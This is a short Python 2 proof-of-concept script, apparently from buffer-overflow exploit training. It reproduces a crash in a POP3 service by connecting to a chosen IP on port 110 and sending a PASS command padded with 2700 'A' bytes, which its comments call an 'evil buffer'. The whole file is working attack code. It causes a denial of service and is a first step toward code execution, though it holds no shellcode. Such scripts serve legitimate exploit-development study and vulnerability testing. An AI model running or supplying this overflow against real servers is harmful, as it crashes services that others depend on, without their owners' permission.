#!/usr/bin/python

# After running the fuzzer against the application,
# A BoF condition was identified after transmitting a password length of 2700 bytes.
# Therefore, we replicate the crash directly through the following script:

# Import sockets

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Supply target IP
targetIP = raw_input('Enter IP associated w/ POP3 target: ')

# Set buffer to that which was identified to result in crashing the program's execution flow
buffer = 'A' * 2700

# Execution
try:
        print "\nSending evil buffer..."
        s.connect((targetIP, 110))
        data = s.recv(1024)
        s.send('USER username' + '\r\n')
        data = s.recv(1024)
        s.send('PASS ' + buffer + '\r\n')
        print '\nSuccess!'
except:
        print 'FAIL: Could not connect to POP3.'

#EOF
